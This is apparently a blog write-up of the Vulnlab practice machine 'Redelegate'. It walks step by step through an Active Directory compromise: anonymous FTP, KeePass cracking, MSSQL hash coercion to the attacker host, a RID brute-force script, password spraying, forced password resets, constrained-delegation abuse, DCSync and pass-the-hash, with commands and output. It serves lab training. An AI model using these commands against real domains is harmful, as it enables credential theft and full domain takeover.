---
layout: post
title: VL Redelegate (Machine hard)
date: 2024-11-24
categories: [Vulnlab, Machine]
tags: [Vulnlab, Machine]
author: Ethicxz
image: assets/image_start/redelegate_slide.png
description: VL Machine Redelegate by Ethicxz
---

# Before Starting 
```console
Me > 10.8.2.163
Target > 10.10.69.178
```
# Ports

```console
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
``` 
The site return nothing interesting but we can login on the FTP :

```bash
nxc ftp 10.10.69.178 -u anonymous -p ''                         
FTP         10.10.69.178    21     10.10.69.178     [*] Banner: Microsoft FTP Service
FTP         10.10.69.178    21     10.10.69.178     [+] anonymous: - Anonymous Login!
```
Connect to ftp : 

```bash
ftp 10.10.69.178              
Connected to 10.10.69.178.
220 Microsoft FTP Service
Name (10.10.69.178:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.

ftp> ls -la
229 Entering Extended Passive Mode (|||60542|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt

# Pass to binary mode and get all files

ftp> binary
```
We can try to crack the .kdbx file

```bash
keepass2john Shared.kdbx > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
It doesnt work but if we look at ```TrainingAgenda.txt``` we can see that :

```console
Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password
```
So we can make a custom wordlist with ```SeasonYear!```

```bash
john --wordlist=wordlist.txt hash.txt

Shared:REDACTED
```
Open the keepass file and retrieve the pass of ```SQLGuest```

```bash
nxc mssql 10.10.69.178 -u 'SQLGuest' -p 'REDACTED' --local-auth 
MSSQL       10.10.69.178    1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.10.69.178    1433   DC               [+] DC\SQLGuest:REDACTED

mssqlclient.py 'SQLGuest':'REDACTED'@redelegate.vl 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
```
After some enumerations i found nothing interesting but i managed to get the NTLMv2 hash of sql_svc like that :

```bash
# on local machine :

Responder -I tun0

# on mssql

SELECT * FROM sys.dm_os_enumerate_filesystem('\\10.8.2.163', 'toto')
```
![alt text](<../assets/image_redelegate/1 leak ntlmv2.png>)

But i didnt manage to crack it

After some research i found this : 

[Enumerate the Domain](https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection)

```sql
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN()
             
----------   
REDELEGATE
```
```sql
SQL (SQLGuest  guest@master)> SELECT SUSER_SID('REDELEGATE\Administrator')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847af4010000'
```
But we can try to brute force RID to get all users on the domain, for example with this python script :

```python
import subprocess

USERNAME = "sqlguest"
PASSWORD = "REDACTED"
SERVER = "redelegate.vl"
SID_BASE = "S-1-5-21-4024337825-2033394866-2055507597"

def execute_query(sid):
    query = f"SELECT SUSER_SNAME(SID_BINARY(N'{SID_BASE}-{sid}'))"
    
    with open("toto", "w") as file:
        file.write(query)
    
    cmd = f"mssqlclient.py {USERNAME}:{PASSWORD}@{SERVER} -file toto"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if result.stdout:
        lines = result.stdout.splitlines()
        for line in lines:
            if "REDELEGATE" in line:  # Vous pouvez filtrer par un mot-clé spécifique
                print(f"SID trouvé : {SID_BASE}-{sid} -> Nom d'utilisateur : {line.strip()}")
    

for sid in range(1100, 1201):  # Plage de 1100 à 1200
    execute_query(sid)
```
And we got :

```console
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1103 -> Nom d'utilisateur : REDELEGATE\FS01$
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1104 -> Nom d'utilisateur : REDELEGATE\Christine.Flanders
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1105 -> Nom d'utilisateur : REDELEGATE\Marie.Curie
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1106 -> Nom d'utilisateur : REDELEGATE\Helen.Frost
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1107 -> Nom d'utilisateur : REDELEGATE\Michael.Pontiac
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1108 -> Nom d'utilisateur : REDELEGATE\Mallory.Roberts
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1109 -> Nom d'utilisateur : REDELEGATE\James.Dinkleberg
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1112 -> Nom d'utilisateur : REDELEGATE\Helpdesk
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1113 -> Nom d'utilisateur : REDELEGATE\IT
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1114 -> Nom d'utilisateur : REDELEGATE\Finance
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1115 -> Nom d'utilisateur : REDELEGATE\DnsAdmins
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1116 -> Nom d'utilisateur : REDELEGATE\DnsUpdateProxy
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1117 -> Nom d'utilisateur : REDELEGATE\Ryan.Cooper
SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1119 -> Nom d'utilisateur : REDELEGATE\sql_svc
```
So we can spray some weak passwords :

```bash
nxc smb redelegate.vl -u users.txt -p 'REDACTED' --continue-on-success
SMB         10.10.69.178    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)

SMB         10.10.69.178    445    DC               [+] redelegate.vl\Marie.Curie:REDACTED
```
```bash
nxc ldap redelegate.vl -u Marie.Curie -p 'REDACTED' --bloodhound --dns-tcp --dns-server 10.10.69.178 -c all
SMB         10.10.69.178    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
LDAP        10.10.69.178    389    DC               [+] redelegate.vl\Marie.Curie:REDACTED 
LDAP        10.10.69.178    389    DC               Resolved collection methods: localadmin, objectprops, trusts, group, acl, dcom, session, container, psremote, rdp
LDAP        10.10.69.178    389    DC               Done in 00M 07S
LDAP        10.10.69.178    389    DC               Compressing output into /root/.nxc/logs/DC_10.10.69.178_2024-11-24_145045_bloodhound.zip
```
![alt text](<../assets/image_redelegate/2er image bh.png>)

Just change the helen.frost password 

```bash
net rpc password "helen.frost" "newP@ssword2022" -U "redelegate.vl"/"marie.curie"%'REDACTED' -S "10.10.69.178"

nxc smb redelegate.vl -u helen.frost -p 'newP@ssword2022'                      
SMB         10.10.69.178    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.69.178    445    DC               [+] redelegate.vl\helen.frost:newP@ssword2022
```
And now we can just winrm : 

```bash
nxc winrm redelegate.vl -u helen.frost -p 'newP@ssword2022'
WINRM       10.10.69.178    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.10.69.178    5985   DC               [+] redelegate.vl\helen.frost:newP@ssword2022 (admin)
```
```bash
evil-winrm -u "helen.frost" -p "newP@ssword2022" -i "redelegate.vl"
```
After some enumerations we can see that :

```powershell
whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

```console
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
```
This is an interesting thing

[Check this link](https://www.thehacker.recipes/ad/movement/kerberos/delegations/) if you want to know what is "delegations" 

On BH we can see that :

![alt text](<../assets/image_redelegate/3eme image.png>)

So let's abuse that :

```bash
net rpc password "FS01$" "newP@ssword2023" -U "redelegate.vl"/"helen.frost"%'newP@ssword2022' -S "10.10.69.178" 

nxc smb redelegate.vl -u 'FS01$' -p 'newP@ssword2023'
SMB         10.10.69.178    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.69.178    445    DC               [+] redelegate.vl\FS01$:newP@ssword2023
```

First, we need to set ```msDS-AllowedToDelegateTo``` on a specific SPN like that :

```powershell
Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}

# and set the TrustedToAuthForDelegation flag

Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```
And now request a ST :

```bash
getST.py 'redelegate.vl'/'FS01$':'newP@ssword2023' -spn 'ldap/dc.redelegate.vl' -impersonate 'dc' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```
And just DCSYNC :

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache 

nxc smb redelegate.vl --use-kcache --ntds

Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...]99:::
```
```bash
evil-winrm -u "Administrator" -H "a[...]99" -i "redelegate.vl"
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
VL{FLAG}
```
Nice !! if u have any questions you can dm me on [Instagram](https://instagram.com/eliott.la) or on discord at 'ethicxz.'